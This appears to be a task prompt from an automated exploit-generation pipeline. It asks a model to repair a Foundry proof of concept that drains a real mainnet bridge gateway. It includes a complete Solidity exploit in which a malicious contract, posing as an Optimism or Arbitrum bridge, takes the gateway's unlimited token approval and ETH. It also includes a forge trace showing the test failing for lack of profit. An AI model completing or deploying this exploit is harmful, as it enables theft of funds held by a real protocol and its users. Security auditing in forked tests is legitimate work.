You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Optimism and Arbitrum routes trust attacker-chosen bridge contracts as spenders and call targets
- claim: These routes accept caller-supplied `customBridgeAddress` or `gatewayAddress` values, grant them `type(uint256).max` allowance over gateway-held ERC20s, and on Optimism native paths immediately send gateway ETH to those attacker-chosen contracts via payable bridge calls.
- impact: An attacker can install an unlimited approval from the gateway to a malicious contract and steal current or future gateway-held ERC20 balances, or directly divert gateway ETH to a malicious payable contract pretending to be the bridge.
- exploit_paths: ["Call an Optimism or Arbitrum ERC20 bridge entrypoint with a malicious `customBridgeAddress`/`gatewayAddress` that uses the freshly granted approval to `transferFrom` gateway tokens.", "Use the Optimism native path with a malicious `customBridgeAddress` implementing `depositETHTo` to receive gateway ETH.", "Use the same pattern through `bridgeAfterSwap` or `swapAndBridge` after residual assets already exist in the gateway."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

contract MaliciousBridge {
    address payable public immutable thief;

    constructor(address payable _thief) {
        thief = _thief;
    }

    receive() external payable {}

    function depositETHTo(address, uint32, bytes calldata) external payable {
        _forwardEth();
    }

    function depositERC20To(
        address l1Token,
        address,
        address,
        uint256,
        uint32,
        bytes calldata
    ) external {
        _drainToken(l1Token, msg.sender);
    }

    function steal(address token, address from) external {
        _drainToken(token, from);
    }

    function _drainToken(address token, address from) internal {
        uint256 balance = _balanceOf(token, from);
        if (balance == 0) return;
        _safeTransferFrom(token, from, thief, balance);
    }

    function _forwardEth() internal {
        uint256 value = address(this).balance;
        if (value == 0) return;
        (bool ok, ) = thief.call{value: value}("");
        require(ok, "ETH_FORWARD_FAILED");
    }

    function _balanceOf(address token, address account) internal view returns (uint256 balance) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!ok || data.length < 32) return 0;
        balance = abi.decode(data, (uint256));
    }

    function _safeTransferFrom(address token, address from, address to, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(bytes4(keccak256("transferFrom(address,address,uint256)")), from, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FROM_FAILED");
    }
}

contract FlawVerifier {
    address public constant GATEWAY = 0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e;
    address public constant NATIVE_TOKEN = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    uint32 private constant FALLBACK_ROUTE_SCAN_COUNT = 385;

    bytes4 private constant EXECUTE_ROUTE_SELECTOR = bytes4(keccak256("executeRoute(uint32,bytes)"));
    bytes4 private constant GET_ROUTE_SELECTOR = bytes4(keccak256("getRoute(uint32)"));
    bytes4 private constant ROUTES_SELECTOR = bytes4(keccak256("routes(uint32)"));
    bytes4 private constant ADDRESS_AT_SELECTOR = bytes4(keccak256("addressAt(uint32)"));
    bytes4 private constant ROUTES_COUNT_SELECTOR = bytes4(keccak256("routesCount()"));

    bytes4 private constant BRIDGE_AFTER_SWAP_SELECTOR = bytes4(keccak256("bridgeAfterSwap(uint256,bytes)"));
    bytes4 private constant OPTIMISM_NATIVE_SELECTOR =
        bytes4(keccak256("bridgeNativeTo(address,address,uint32,uint256,bytes32,bytes)"));

    bytes4 private constant ROUTE_GETTER_NATIVE_OPTIMISM =
        bytes4(keccak256("NATIVE_OPTIMISM_ERC20_EXTERNAL_BRIDGE_FUNCTION_SELECTOR()"));
    bytes4 private constant ROUTE_GETTER_NATIVE_ARBITRUM =
        bytes4(keccak256("NATIVE_ARBITRUM_ERC20_EXTERNAL_BRIDGE_FUNCTION_SELECTOR()"));

    bytes4 private constant NATIVE_OPTIMISM_ERC20_SELECTOR =
        bytes4(
            keccak256("bridgeERC20To(address,address,address,uint32,(bytes32,bytes32),uint256,uint256,address,bytes)")
        );
    bytes4 private constant NATIVE_OPSTACK_ERC20_SELECTOR =
        bytes4(
            keccak256("bridgeERC20To(address,address,address,uint32,bytes32,uint256,address,uint256,bytes32,bytes)")
        );
    bytes4 private constant NATIVE_ARBITRUM_ERC20_SELECTOR =
        bytes4(keccak256("bridgeERC20To(uint256,uint256,uint256,uint256,bytes32,address,address,address,bytes)"));

    MaliciousBridge public immutable maliciousBridge;

    address private _profitToken;
    uint256 private _profitAmount;

    struct RouteIds {
        uint32 nativeOptimism;
        uint32 nativeOpStack;
        uint32 nativeArbitrum;
    }

    struct OptimismBridgeData {
        uint256 interfaceId;
        bytes32 currencyKey;
        bytes32 metadata;
        address receiverAddress;
        address customBridgeAddress;
        address token;
        uint32 l2Gas;
        address l2Token;
        bytes data;
    }

    struct OpStackBridgeData {
        bytes32 metadata;
        address receiverAddress;
        uint256 toChainId;
        bytes32 bridgeHash;
        address customBridgeAddress;
        address token;
        uint32 l2Gas;
        address l2Token;
        bytes data;
    }

    struct ArbitrumBridgeData {
        uint256 value;
        uint256 maxGas;
        uint256 gasPriceBid;
        address receiverAddress;
        address gatewayAddress;
        address token;
        bytes32 metadata;
        bytes data;
    }

    constructor() {
        maliciousBridge = new MaliciousBridge(payable(address(this)));
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        RouteIds memory routeIds = _discoverRoutes();

        if (_attemptOptimismNative(routeIds.nativeOptimism)) {
            return;
        }

        address[20] memory tokens = [
            address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48),
            address(0xdAC17F958D2ee523a2206206994597C13D831ec7),
            address(0x6B175474E89094C44Da98b954EedeAC495271d0F),
            address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2),
            address(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599),
            address(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84),
            address(0xae78736Cd615f374D3085123A210448E74Fc6393),
            address(0xBe9895146f7AF43049ca1c1AE358B0541Ea49704),
            address(0x5f98805A4E8be255a32880FDeC7F6728C6568bA0),
            address(0x853d955aCEf822Db058eb8505911ED77F175b99e),
            address(0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E),
            address(0xC011A72400E58ecD99Ee497CF89E3775d4bd732F),
            address(0x57Ab1ec28D129707052df4dF418D58a2D46d5f51),
            address(0x514910771AF9Ca656af840dff83E8264EcF986CA),
            address(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984),
            address(0xD533a949740bb3306d119CC777fa900bA034cd52),
            address(0x7f39C581F595B53c5cb5aFFD0FBaC0fCA0DCA0D2),
            address(0x956F47F50A910163D8BF957Cf5846D573E7f87CA),
            address(0x111111111117dC0aa78b770fA6A738034120C302),
            address(0x68749665FF8D2d112Fa859AA293F07A622782F38)
        ];

        for (uint256 i = 0; i < tokens.length; ++i) {
            address token = tokens[i];
            if (_balanceOf(token, GATEWAY) == 0) continue;

            if (_attemptOptimismBridgeAfterSwap(routeIds.nativeOptimism, token)) {
                return;
            }
            if (_attemptOpStackBridgeAfterSwap(routeIds.nativeOpStack, token)) {
                return;
            }
            if (_attemptArbitrumBridgeAfterSwap(routeIds.nativeArbitrum, token)) {
                return;
            }
        }

        // `swapAndBridge` retains the same root cause but requires an attacker-controlled swap leg to first source
        // bridgeable inventory. Under the direct-or-existing-balance-first strategy, the verifier only uses already
        // resident gateway ETH or residual gateway ERC20 balances and therefore stops after the direct/native and
        // `bridgeAfterSwap` variants of the same allowance/call-target trust bug.
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptOptimismNative(uint32 routeId) internal returns (bool) {
        if (routeId == type(uint32).max) return false;

        uint256 gatewayEth = GATEWAY.balance;
        if (gatewayEth == 0) return false;

        uint256 beforeBalance = address(this).balance;
        bytes memory routeData = abi.encodeWithSelector(
            OPTIMISM_NATIVE_SELECTOR,
            address(this),
            address(maliciousBridge),
            uint32(0),
            gatewayEth,
            bytes32("OPT_ETH"),
            ""
        );

        if (!_executeRoute(routeId, routeData)) {
            return false;
        }

        return _recordProfit(NATIVE_TOKEN, beforeBalance);
    }

    function _attemptOptimismBridgeAfterSwap(uint32 routeId, address token) internal returns (bool) {
        if (routeId == type(uint32).max) return false;

        uint256 gatewayBalance = _balanceOf(token, GATEWAY);
        if (gatewayBalance == 0) return false;

        uint256 beforeBalance = _balanceOf(token, address(this));
        OptimismBridgeData memory data = OptimismBridgeData({
            interfaceId: 1,
            currencyKey: bytes32(0),
            metadata: bytes32("OPT_ERC20"),
            receiverAddress: address(this),
            customBridgeAddress: address(maliciousBridge),
            token: token,
            l2Gas: 0,
            l2Token: token,
            data: ""
        });

        if (!_executeRoute(routeId, abi.encodeWithSelector(BRIDGE_AFTER_SWAP_SELECTOR, gatewayBalance, abi.encode(data)))) {
            return false;
        }

        return _recordProfit(token, beforeBalance);
    }

    function _attemptOpStackBridgeAfterSwap(uint32 routeId, address token) internal returns (bool) {
        if (routeId == type(uint32).max) return false;

        uint256 gatewayBalance = _balanceOf(token, GATEWAY);
        if (gatewayBalance == 0) return false;

        uint256 beforeBalance = _balanceOf(token, address(this));
        OpStackBridgeData memory data = OpStackBridgeData({
            metadata: bytes32("OPSTACK"),
            receiverAddress: address(this),
            toChainId: 10,
            bridgeHash: keccak256("malicious-opstack"),
            customBridgeAddress: address(maliciousBridge),
            token: token,
            l2Gas: 0,
            l2Token: token,
            data: ""
        });

        if (!_executeRoute(routeId, abi.encodeWithSelector(BRIDGE_AFTER_SWAP_SELECTOR, gatewayBalance, abi.encode(data)))) {
            return false;
        }

        return _recordProfit(token, beforeBalance);
    }

    function _attemptArbitrumBridgeAfterSwap(uint32 routeId, address token) internal returns (bool) {
        if (routeId == type(uint32).max) return false;

        uint256 gatewayBalance = _balanceOf(token, GATEWAY);
        if (gatewayBalance == 0) return false;

        uint256 beforeBalance = _balanceOf(token, address(this));
        ArbitrumBridgeData memory data = ArbitrumBridgeData({
            value: 0,
            maxGas: 0,
            gasPriceBid: 0,
            receiverAddress: address(this),
            gatewayAddress: address(maliciousBridge),
            token: token,
            metadata: bytes32("ARB_ERC20"),
            data: ""
        });

        if (!_executeRoute(routeId, abi.encodeWithSelector(BRIDGE_AFTER_SWAP_SELECTOR, gatewayBalance, abi.encode(data)))) {
            return false;
        }

        // The router path sets allowance before interacting with Arbitrum's router. If that downstream call succeeds,
        // the malicious gateway can immediately consume the new approval and pull the gateway's full residual balance.
        maliciousBridge.steal(token, GATEWAY);

        return _recordProfit(token, beforeBalance);
    }

    function _discoverRoutes() internal view returns (RouteIds memory routeIds) {
        routeIds.nativeOptimism = type(uint32).max;
        routeIds.nativeOpStack = type(uint32).max;
        routeIds.nativeArbitrum = type(uint32).max;

        uint32 count = _routeScanCount();
        for (uint32 i = 0; i < count; ++i) {
            address route = _routeAt(i);
            if (route == address(0)) continue;

            bytes4 optimisticSelector = _readBytes4(route, ROUTE_GETTER_NATIVE_OPTIMISM);
            if (optimisticSelector == NATIVE_OPTIMISM_ERC20_SELECTOR) {
                routeIds.nativeOptimism = i;
                continue;
            }
            if (optimisticSelector == NATIVE_OPSTACK_ERC20_SELECTOR) {
                routeIds.nativeOpStack = i;
                continue;
            }

            bytes4 arbitrumSelector = _readBytes4(route, ROUTE_GETTER_NATIVE_ARBITRUM);
            if (arbitrumSelector == NATIVE_ARBITRUM_ERC20_SELECTOR) {
                routeIds.nativeArbitrum = i;
            }
        }
    }

    function _routeScanCount() internal view returns (uint32 count) {
        (bool ok, bytes memory data) = GATEWAY.staticcall(abi.encodeWithSelector(ROUTES_COUNT_SELECTOR));
        if (ok && data.length >= 32) {
            uint256 decoded = abi.decode(data, (uint256));
            if (decoded > 0 && decoded <= type(uint32).max) {
                count = uint32(decoded);
                return count;
            }
        }
        count = FALLBACK_ROUTE_SCAN_COUNT;
    }

    function _routeAt(uint32 routeId) internal view returns (address route) {
        route = _readAddress(GATEWAY, abi.encodeWithSelector(GET_ROUTE_SELECTOR, routeId));
        if (route != address(0)) return route;

        route = _readAddress(GATEWAY, abi.encodeWithSelector(ROUTES_SELECTOR, routeId));
        if (route != address(0)) return route;

        route = _readAddress(GATEWAY, abi.encodeWithSelector(ADDRESS_AT_SELECTOR, routeId));
    }

    function _executeRoute(uint32 routeId, bytes memory routeData) internal returns (bool ok) {
        (ok, ) = GATEWAY.call(abi.encodeWithSelector(EXECUTE_ROUTE_SELECTOR, routeId, routeData));
    }

    function _recordProfit(address token, uint256 beforeBalance) internal returns (bool) {
        uint256 afterBalance = token == NATIVE_TOKEN ? address(this).balance : _balanceOf(token, address(this));
        if (afterBalance <= beforeBalance) return false;

        _profitToken = token;
        _profitAmount = afterBalance - beforeBalance;
        return true;
    }

    function _readBytes4(address target, bytes4 selector) internal view returns (bytes4 value) {
        (bool ok, bytes memory data) = target.staticcall(abi.encodeWithSelector(selector));
        if (!ok || data.length < 32) return bytes4(0);
        value = abi.decode(data, (bytes4));
    }

    function _readAddress(address target, bytes memory payload) internal view returns (address value) {
        (bool ok, bytes memory data) = target.staticcall(payload);
        if (!ok || data.length < 32) return address(0);
        value = abi.decode(data, (address));
    }

    function _balanceOf(address token, address account) internal view returns (uint256 balance) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!ok || data.length < 32) return 0;
        balance = abi.decode(data, (uint256));
    }
}

```

forge stdout (tail):
```
602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2795] 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [33736] 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   ├─ [8263] 0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc::be00bbd8(f1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
    │   │   │   ├─ [2820] 0x2b33CF282f867A7FF693A66e11B0FcC5552e4425::be00bbd8(f1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb
    │   │   │   └─ ← [Return] 0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb
    │   │   ├─ [14856] 0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [2486] 0xae78736Cd615f374D3085123A210448E74Fc6393::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [9726] 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   ├─ [2529] 0x31724cA0C982A31fbb5C57f4217AB585271fc9a5::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [2487] 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2666] 0x853d955aCEf822Db058eb8505911ED77F175b99e::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2710] 0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [10449] 0xC011A72400E58ecD99Ee497CF89E3775d4bd732F::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   ├─ [4983] 0x54f25546260C7539088982bcF4b7dC8EDEF19f21::bc67f832(0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f)
    │   │   │   └─ ← [Revert] Only the proxy can call
    │   │   └─ ← [Revert] Only the proxy can call
    │   ├─ [13455] 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   ├─ [7931] 0x10A5F7D9D65bCc2734763444D4940a31b109275f::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e)
    │   │   │   ├─ [2497] 0x05a9CBe762B36632b3594DA4F082340E0e5343e8::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [2655] 0x514910771AF9Ca656af840dff83E8264EcF986CA::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2797] 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2930] 0xD533a949740bb3306d119CC777fa900bA034cd52::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [0] 0x7f39C581F595B53c5cb5aFFD0FBaC0fCA0DCA0D2::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [2678] 0x956F47F50A910163D8BF957Cf5846D573E7f87CA::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2510] 0x111111111117dC0aa78b770fA6A738034120C302::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [9891] 0x68749665FF8D2d112Fa859AA293F07A622782F38::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   ├─ [2560] 0x4C0d2c74A8D26f1E4F5653021c521F5471F9e566::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [345] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2363] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x54f25546260C7539088982bcF4b7dC8EDEF19f21
  at 0xC011A72400E58ecD99Ee497CF89E3775d4bd732F.balanceOf
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 10.68s (10.64s CPU time)

Ran 1 test suite in 10.69s (10.68s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 1015527)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
